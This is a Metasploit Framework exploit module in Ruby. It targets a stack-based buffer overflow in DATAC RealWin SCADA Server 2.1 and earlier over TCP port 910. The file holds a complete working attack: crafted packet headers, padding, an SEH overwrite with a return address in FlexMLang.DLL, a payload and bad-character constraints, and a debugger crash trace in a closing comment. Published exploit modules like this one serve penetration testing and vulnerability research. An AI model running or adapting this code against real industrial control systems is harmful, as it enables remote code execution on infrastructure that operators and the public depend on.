##
# $Id: realwin_on_fc_binfile_a.rb 12975 2011-06-20 04:01:47Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
 
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'DATAC RealWin SCADA Server 2 On_FC_CONNECT_FCS_a_FILE Buffer Overflow',
            'Description'    => %q{
                    This module exploits a vulnerability found in DATAC Control International RealWin
                SCADA Server 2.1 and below. By supplying a specially crafted On_FC_BINFILE_FCS_*FILE
                packet via port 910, RealWin will try to create a file (which would be saved to
                C:\Program Files\DATAC\Real Win\RW-version\filename) by first copying the user-
                supplied filename with a inline memcpy routine without proper bounds checking, which
                results a stack-based buffer overflow, allowing arbitrary remote code execution.
 
                Tested version: 2.0 (Build 6.1.8.10)
            },
            'Author'         => [ 'Luigi Auriemma', 'MC' ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 12975 $',
            'References'     =>
                [
                    [ 'URL', 'http://aluigi.altervista.org/adv/realwin_5-adv.txt' ],
                ],
            'Privileged'     => true,
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'thread',
                },
            'Payload'        =>
                {
                    'Space'    => 450,
                    'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
                    'StackAdjustment' => -3500,
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'Universal', { 'Ret' => 0x4002da21 } ], # P/P/R FlexMLang.DLL 8.1.45.19
                ],
            'DefaultTarget' => 0,
            'DisclosureDate' => 'Mar 21 2011'))
 
        register_options([Opt::RPORT(910)], self.class)
    end
 
    def exploit
 
        connect
 
        data =  [0x67542310].pack('V')
        data << [0x00000824].pack('V')
        data << [0x00100001].pack('V')
        data << [0x00000001].pack('V')  #Packet type
        data << [0x00060000].pack('V')
        data << [0x0000ffff].pack('V')
        data << rand_text_alpha_upper(221)
        data << generate_seh_payload(target.ret)
        data << rand_text_alpha_upper(17706 - payload.encoded.length)
        data << [0x451c3500].pack('V')
        data << [0x00000154].pack('V')
        data << [0x00020040].pack('V')
 
        print_status("Trying target #{target.name}...")
        sock.put(data)
        select(nil,nil,nil,0.5)
 
        handler
        disconnect
 
    end
 
end
 
 
=begin
0:022> r
eax=00000819 ebx=0587f89c ecx=00000039 edx=011fba04 esi=011fc138 edi=0587fffd
eip=0042702f esp=0587f738 ebp=011fba04 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
RealWinDemo+0x2702f:
0042702f f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:022> !exchain
0587f748: RealWinDemo+e0b78 (004e0b78)
0587f9a4: FlexMLang!GetFlexMLangIResourceBrowser+2b991 (4002da21)
Invalid exception stack at 49a206eb
0:022> u 4002da21
FlexMLang!GetFlexMLangIResourceBrowser+0x2b991:
4002da21 5e              pop     esi
4002da22 5b              pop     ebx
4002da23 c3              ret
=end
